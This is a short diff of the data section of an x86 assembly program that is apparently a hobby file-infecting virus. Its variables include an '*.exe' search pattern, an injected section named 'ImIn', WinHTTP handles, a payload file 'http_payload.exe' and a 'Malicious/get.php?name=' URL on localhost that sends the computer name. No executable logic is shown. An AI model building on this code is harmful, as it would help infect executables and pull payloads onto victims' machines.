@@ -4,7 +4,7 @@ jmp	start
 ; FILE
 OldProtect		dd		?
 FileData		WIN32_FIND_DATA	<>
-DebugDone		db		"Done", 0 ; TODO remove
+DebugDone		db		"Done", 0
 SearchFolder		db		"*.exe", 0
 HandleSearch		dd		?
 NewSectionName		db		"ImIn", 0
@@ -70,7 +70,6 @@ sMessageBox	db	'MessageBoxA', 0
 sLoadLibrary	db	'LoadLibraryA', 0 
 sFindFirstFile	db	'FindFirstFileA', 0
 sFindNextFile	db	'FindNextFileA', 0
-sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
 sWinHttp	db	'WINHTTP.DLL', 0
 sKernel32	db	'KERNEL32.DLL', 0
@@ -112,16 +111,15 @@ pFindNextFile	dd	?
 RetFromThread	dd	?
 ThreadId	dd	?
 ThreadHandle	dd	?
-WUT		db	'C:\MinGW\msys\1.0\home\Shinao\Malicious\Malicious\test\notavirus.exe', 0
 Number		dd	?
 HttpSession	dd	?
 HttpConnect	dd	?
 HttpRequest	dd	?
-MaliciousFile	db	'notavirus.exe', 0
+MaliciousFile	db	'http_payload.exe', 0
 MaliciousUrl	db	'M', 0, 'a', 0, 'l', 0, 'i', 0, 'c', 0, 'i', 0, 'o', 0, 'u', 0, 's', 0, '/', 0, 'g', 0, 'e', 0, 't', 0, '.', 0, 'p', 0, 'h', 0, 'p', 0, '?', 0, 'n', 0, 'a', 0, 'm', 0, 'e', 0, '=', 0
 MaliciousUrl2	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
 MaliciousDomain	db	'l',0,'o',0,'c',0,'a',0,'l',0,'h',0,'o',0,'s',0,'t',0,0,0
-ComputerName	db	"XXXXXXXXXXXXXXXXXXXX", 0
+ComputerName	db	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0
 LengthName	dd	?
 VolumeID	dd	?
 _SYSTEMTIME	STRUC
